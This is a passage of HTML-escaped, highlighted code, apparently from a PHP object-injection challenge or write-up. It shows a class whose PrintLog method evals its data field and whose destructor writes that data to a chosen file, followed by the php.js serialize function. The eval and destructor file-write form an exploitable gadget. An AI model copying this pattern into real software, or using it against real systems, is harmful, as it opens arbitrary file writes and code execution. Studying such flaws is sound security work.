    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;PrintLog&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$pre&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;[LOG]&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	      &lt;span class=&quot;nv&quot;&gt;$now&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Y-m-d H:i:s'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

        &lt;span class=&quot;nv&quot;&gt;$str&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'$pre - $now - $this-&amp;gt;data'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;eval&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\$&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;str = &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$str&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;__destruct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	     &lt;span class=&quot;nb&quot;&gt;file_put_contents&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;FILE_APPEND&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;b&gt;php.js&lt;/b&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;serialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;mixed_value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;//  discuss at: http://phpjs.org/functions/serialize/&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;// original by: Arpad Ray (mailto:arpad@php.net)&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;// improved by: Dino&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;// improved by: Le Torbi (http://www.letorbi.de/)&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;// improved by: Kevin van Zonneveld (http://kevin.vanzonneveld.net/)&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;// bugfixed by: Andrej Pavlovic&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;// bugfixed by: Garagoth&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;// bugfixed by: Russell Walker (http://www.nbill.co.uk/)&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;// bugfixed by: Jamie Beck (http://www.terabit.ca/)&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;// bugfixed by: Kevin van Zonneveld (http://kevin.vanzonneveld.net/)&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;// bugfixed by: Ben (http://benblume.co.uk/)&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;//    input by: DtTvB (http://dt.in.th/2008-09-16.string-length-in-bytes.html)&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;//    input by: Martin (http://www.erlenwiese.de/)&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;//        note: We feel the main purpose of this function should be to ease the transport of data between php &amp;amp; js&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;//        note: Aiming for PHP-compatibility, we have to translate objects to arrays&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;//   example 1: serialize(['Kevin', 'van', 'Zonneveld']);&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;//   returns 1: 'a:3:{i:0;s:5:&quot;Kevin&quot;;i:1;s:3:&quot;van&quot;;i:2;s:9:&quot;Zonneveld&quot;;}'&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;//   example 2: serialize({firstName: 'Kevin', midName: 'van', surName: 'Zonneveld'});&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;//   returns 2: 'a:3:{s:9:&quot;firstName&quot;;s:5:&quot;Kevin&quot;;s:7:&quot;midName&quot;;s:3:&quot;van&quot;;s:7:&quot;surName&quot;;s:9:&quot;Zonneveld&quot;;}'&lt;/span&gt;

  &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;val&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;okey&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;ktype&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;vals&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;_utf8Size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;l&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;code&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;l&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;code&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;charCodeAt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;code&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0080&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
          &lt;span class=&quot;nx&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;code&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0800&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
          &lt;span class=&quot;nx&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
          &lt;span class=&quot;nx&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;_getType&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;inp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;match&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;cons&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;types&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;typeof&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;inp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;===&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'object'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;inp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'null'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;===&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'object'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;inp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;constructor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'object'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;cons&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;inp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;constructor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;match&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;cons&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;match&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;(\w&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;)\(&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;match&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
          &lt;span class=&quot;nx&quot;&gt;cons&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;match&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;toLowerCase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;types&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'boolean'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'number'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'string'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'array'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;key&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;types&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cons&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;types&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;nx&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;types&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
          &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;_getType&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;mixed_value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

  &lt;span class=&quot;k&quot;&gt;switch&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'function'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;val&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'boolean'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;val&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'b:'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;mixed_value&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'1'&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'0'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'number'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;val&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;Math&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;round&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;mixed_value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;mixed_value&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'i'&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'d'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;':'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;mixed_value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'string'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;val&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'s:'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;_utf8Size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;mixed_value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;':&quot;'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;mixed_value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&quot;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'array'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'object'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;val&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'a'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;cm&quot;&gt;/*
        if (type === 'object') {
          var objname = mixed_value.constructor.toString().match(/(\w+)\(\)/);
          if (objname == undefined) {
            return;
          }
          objname[1] = this.serialize(objname[1]);
          val = 'O' + objname[1].substring(1, objname[1].length - 1);
        }
        */&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;key&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;mixed_value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;mixed_value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;hasOwnProperty&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;ktype&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;_getType&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;mixed_value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
